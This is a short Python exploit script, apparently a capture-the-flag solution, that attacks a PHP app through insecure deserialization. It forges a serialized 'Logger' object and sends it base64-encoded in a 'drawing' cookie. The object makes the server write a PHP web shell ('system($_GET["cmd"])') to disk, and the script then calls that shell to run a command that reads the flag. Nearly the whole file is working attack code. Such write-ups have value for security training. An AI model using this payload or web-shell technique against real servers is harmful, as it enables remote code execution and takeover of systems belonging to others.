import base64
import requests
from requests.auth import HTTPBasicAuth

url='http://localhost'
webshell_url = 'http://localhost/webshell.php'
auth=('username','password')
session=requests.session()
session.auth=auth

def generate_payload():
    logFile_key = '\x00Logger\x00logFile'
    initMsg_key = '\x00Logger\x00initMsg'
    exitMsg_key = '\x00Logger\x00exitMsg'

    logFile_val = '/path/webshell.php'
    initMsg_val = ''
    exitMsg_val = '<?php system($_GET["cmd"]); ?>'

    serialized = 'O:6:"Logger":3:{' \
                 's:15:"\x00Logger\x00logFile";s:' + str(len(logFile_val)) + ':"' + logFile_val + '";' \
                 's:15:"\x00Logger\x00initMsg";s:' + str(len(initMsg_val)) + ':"' + initMsg_val + '";' \
                 's:15:"\x00Logger\x00exitMsg";s:' + str(len(exitMsg_val)) + ':"' + exitMsg_val + '";' \
                 '}'

    return base64.b64encode(serialized.encode()).decode()

payload = generate_payload()

data = {'x1': '1', 'y1': '1', 'x2': '1', 'y2': '1'}

cookies = {'drawing' : payload}
response = session.get(url, cookies=cookies, params=data)


response = session.get(webshell_url, cookies=cookies, params={'cmd': '/pathflag'})

print(response.text)

